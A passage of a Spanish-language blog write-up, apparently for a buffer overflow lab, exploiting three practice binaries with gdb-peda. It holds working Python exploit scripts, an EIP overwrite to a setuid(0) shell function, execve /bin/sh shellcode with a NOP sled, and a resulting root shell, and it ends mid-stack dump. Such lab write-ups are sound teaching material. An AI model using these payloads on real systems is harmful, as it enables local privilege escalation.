-    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
-  </li>
-  <li>
-    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
-
-first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>
-
-key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>
-
-print<span class="o">(</span>first + key<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
-  </li>
-  <li>
-    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
-Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
-Key is: 0x42424242
-<span class="nv">$ </span><span class="nb">whoami
-</span>miguel
-</code></pre></div></div>
-
-<h2 id="leveltwo">LevelTwo</h2>
-
-<blockquote>
-  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
-</blockquote>
-
-<ul>
-  <li>
-    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
-  </li>
-  <li>
-    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/2.png" />
-</p>
-
-<ul>
-  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/3.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
-  </li>
-  <li>
-    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/4.png" />
-</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
-  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
-  <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
-Reading symbols from levelTwo...
-<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
-Set 1 arguments to program
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo corremos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
-Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
-<span class="o">[</span>Thread debugging using libthread_db enabled]
-Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
-Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
-
-Program received signal SIGSEGV, Segmentation fault.
-Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
-
-Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
-<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
-EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
-EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
-ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
-EDX: 0x1
-ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
-EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
-ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
-EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
-<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
-Invalid <span class="nv">$PC</span> address: 0x61414145
-<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
-0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
-<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
-1631666501 found at offset: 36
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
-All functions matching regular expression <span class="s2">"^spawn$"</span>:
-
-Non-debugging symbols:
-0x565561e9  spawn
-</code></pre></div></div>
-
-<ul>
-  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
-<span class="c">#!/usr/bin/python2</span>
-
-offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>
-
-null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>
-
-spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>
-
-print<span class="o">(</span>null + spawn<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Y funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
-Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
-<span class="c"># whoami</span>
-root
-<span class="c">#</span>
-</code></pre></div></div>
-
-<h2 id="level-3">Level 3</h2>
-
-<blockquote>
-  <p>Stack Based.</p>
-</blockquote>
-
-<ul>
-  <li>
-    <p>Vamos a observar el código.</p>
-  </li>
-  <li>
-    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/main.png" />
-</p>
-
-<ul>
-  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/main2.png" />
-</p>
-
-<ul>
-  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
-</ul>
-
-<pre><code class="language-C">void overflow(char *param_1)
-
-{
-  char local_10c [260];
-  
-  strcpy(local_10c,param_1);
-  printf("Buf: %s\n",local_10c);
-  return;
-}
-</code></pre>
-
-<ul>
-  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
-Reading symbols from levelThree...
-<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
-gdb-peda<span class="nv">$ </span>pattern_arg 300
-Set 1 arguments to program
-gdb-peda<span class="nv">$ </span>run
-Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
-<span class="o">[</span>Thread debugging using libthread_db enabled]
-Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
-Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
-
-Program received signal SIGSEGV, Segmentation fault.
-Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
-
-Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
-<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
-EAX: 0x132
-EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
-ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
-EDX: 0x1
-ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
-EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
-ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
-EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
-EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
-<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
-Invalid <span class="nv">$PC</span> address: 0x41332541
-<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
-0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
-0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
-0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
-0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
-0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
-0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
-0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
-0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
-<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
-1093870913 found at offset: 268
-</code></pre></div></div>
-
-<ul>
-  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
-
-offset <span class="o">=</span> 268
-
-shellcode  <span class="o">=</span> b<span class="s2">""</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
-<span class="c">#!/usr/bin/python2</span>
-<span class="c"># -*- coding: utf-8 -*-</span>
-
-offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>
-
-shellcode  <span class="o">=</span> b<span class="s2">""</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
-
-junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
-eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
-print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
-Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
-<span class="o">[</span>Thread debugging using libthread_db enabled]
-Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
-Buf: j
-      XRh//shh/bin��BBBB
-
-Program received signal SIGSEGV, Segmentation fault.
-Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
-
-Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
-<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
-EAX: 0x116
-EBX: 0xe3896e69
-ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
-EDX: 0x1
-ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
-EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-EBP: 0x80cdc931
-ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
-EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
-EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
-<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
-Invalid <span class="nv">$PC</span> address: 0x42424242
-<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
-0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
-0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
-0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
-0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
-<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
-  </li>
-  <li>
-    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/pila.png" />
-</p>
-
-<ul>
-  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
-</ul>
-
-<blockquote>
-  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
-0xffffd240:	0xffffd400	0x00000000	0x00000000	0x56556237
-0xffffd250:	0x00000000	0x00000000	0x00000013	0x00000000
-0xffffd260:	0xf7c216ac	0xf7fd9e61	0xf7c1c9a2	0xffffd290
-0xffffd270:	0xf7e1dff4	0x56556280	0x00000000	0xf7c237c5
-0xffffd280:	0x00000001	0x00000000	0x00000078	0xf7c237c5
-0xffffd290:	0x00000002	0xffffd344	0xffffd350	0xffffd2b0
-0xffffd2a0:	0xf7e1dff4	0x56556212	0x00000002	0xffffd344
-0xffffd2b0:	0xf7e1dff4	0x56556280	0xf7ffcba0	0x00000000
-0xffffd2c0:	0x8a0cc8d7	0xf1c6e2c7	0x00000000	0x00000000
-0xffffd2d0:	0x00000000	0xf7ffcba0	0x00000000	0xd1348400
-0xffffd2e0:	0xf7ffda30	0xf7c23756	0xf7e1dff4	0xf7c23888
-0xffffd2f0:	0xf7fcaac4	0x56559000	0x00000002	0x56556090
-0xffffd300:	0x00000000	0xf7fdbe80	0xf7c23809	0x56559000
-0xffffd310:	0x00000002	0x56556090	0x00000000	0x565560c1
-0xffffd320:	0x56556212	0x00000002	0xffffd344	0x56556280
-0xffffd330:	0x565562e0	0xf7fceca0	0xffffd33c	0xf7ffda30
-0xffffd340:	0x00000002	0xffffd4bc	0xffffd4e9	0x00000000
-0xffffd350:	0xffffd5fa	0xffffd60e	0xffffd619	0xffffd626
-0xffffd360:	0xffffd684	0xffffd693	0xffffd6b7	0xffffd6ce
-0xffffd370:	0xffffdde7	0xffffddfb	0xffffde08	0xffffde12
-0xffffd380:	0xffffde1d	0xffffde30	0xffffde49	0xffffde58
-0xffffd390:	0xffffde63	0xffffde6e	0xffffde91	0xffffdeac
